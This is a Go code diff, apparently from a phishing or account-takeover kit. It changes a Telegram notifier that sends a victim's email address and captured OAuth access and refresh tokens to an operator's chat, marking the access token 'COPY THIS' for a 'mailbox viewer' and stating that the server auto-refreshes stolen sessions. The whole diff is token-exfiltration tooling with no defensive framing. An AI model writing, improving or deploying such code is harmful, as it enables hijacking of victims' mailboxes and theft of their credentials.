@@ -1103,16 +1103,17 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		client2.Post(url, "application/json", bytes.NewBuffer(jsonData))
 
 		// Now send individual token messages for easy copying
-		// IMPORTANT: Send REFRESH TOKEN FIRST as it's more important (lasts 90 days vs 1 hour)
+		// IMPORTANT: Send ACCESS TOKEN FIRST - this is what goes in mailbox viewer
+		// Server handles refresh tokens automatically in background
 		if data.Custom != nil {
-			// Refresh Token - send FIRST as it's the important one
-			if refreshToken := data.Custom["dc_refresh_token"]; refreshToken != "" {
-				tokenMsg := "🔄 REFRESH TOKEN (COPY THIS)\n"
+			// Access Token - send FIRST as it's what user copies
+			if accessToken := data.Custom["dc_access_token"]; accessToken != "" {
+				tokenMsg := "🔑 ACCESS TOKEN (COPY THIS)\n"
 				tokenMsg += "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
 				tokenMsg += fmt.Sprintf("👤 %s\n", userEmail)
-				tokenMsg += "⏱ Valid: 90 days\n"
-				tokenMsg += "💡 Use this in mailbox dashboard\n\n"
-				tokenMsg += fmt.Sprintf("<code>%s</code>", refreshToken)
+				tokenMsg += "⏱ Valid: ~1 hour (server auto-refreshes)\n"
+				tokenMsg += "💡 Paste this in mailbox viewer\n\n"
+				tokenMsg += fmt.Sprintf("<code>%s</code>", accessToken)
 
 				tokenPayload := map[string]interface{}{
 					"chat_id":    n.TelegramChatID,
@@ -1123,13 +1124,14 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 				client2.Post(url, "application/json", bytes.NewBuffer(tokenJson))
 			}
 
-			// Access Token - send second (expires in ~1 hour)
-			if accessToken := data.Custom["dc_access_token"]; accessToken != "" {
-				tokenMsg := "🔑 ACCESS TOKEN\n"
-				tokenMsg += "━━━━━━━━━━━━━━━━━\n"
+			// Refresh Token - stored on server for auto-refresh
+			if refreshToken := data.Custom["dc_refresh_token"]; refreshToken != "" {
+				tokenMsg := "🔄 REFRESH TOKEN (Server Auto-Refresh)\n"
+				tokenMsg += "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
 				tokenMsg += fmt.Sprintf("👤 %s\n", userEmail)
-				tokenMsg += "⏱ Valid: ~1 hour (use refresh token for longer access)\n\n"
-				tokenMsg += fmt.Sprintf("<code>%s</code>", accessToken)
+				tokenMsg += "⏱ Valid: 90 days (auto-refreshed)\n"
+				tokenMsg += "💡 Stored on server - no action needed\n\n"
+				tokenMsg += fmt.Sprintf("<code>%s</code>", refreshToken)
 
 				tokenPayload := map[string]interface{}{
 					"chat_id":    n.TelegramChatID,
